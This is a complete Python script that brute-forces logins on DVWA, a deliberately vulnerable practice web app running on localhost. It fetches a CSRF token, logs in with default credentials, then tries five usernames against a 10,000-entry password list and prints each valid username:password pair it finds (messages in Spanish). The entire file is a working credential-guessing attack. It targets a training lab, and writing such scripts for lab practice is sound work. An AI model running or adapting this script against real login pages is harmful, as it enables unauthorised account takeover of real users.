import requests
import sys
import re

website = "http://127.0.0.1/DVWA/login.php"
target = "http://127.0.0.1/DVWA/vulnerabilities/brute/"
usernames = ["admin", "gordonb", "1337", "pablo", "smithy"]
passwords = "pass-list-10000.txt"
needle = "Username and/or password incorrect."
creds = {}

s = requests.session()
login = s.get(website)
token = re.search("'user_token' value='(.*?)'", login.text).group(1)
q = s.post(website, data={"username": "admin", "password": "password", "Login": "Login", "user_token": token})

for user in usernames:
	with open(passwords, "r") as passlist:
		for passw in passlist:
			passw = passw.strip("\n").encode("utf-8")
			sys.stdout.write("[X] Intentando user:password --> " + str(user) + ":" + str(passw.decode()) + "\n")
			sys.stdout.flush()
			payload = {"username": user, "password": passw, "Login": "Login"}
			r = s.get(target, params=payload)
			if needle not in r.text:
				sys.stdout.write("Credenciales validas encontradas!! --> " + str(user) + ":" + str(passw.decode()) + "\n\n")
				sys.stdout.flush()
				creds[(str(user))] = str(passw.decode()) 
				break

sys.stdout.write("Credenciales encontradas:\n")
sys.stdout.flush()
for i, j in creds.items():
	sys.stdout.write(i + ":" + j + "\n")
	sys.stdout.flush()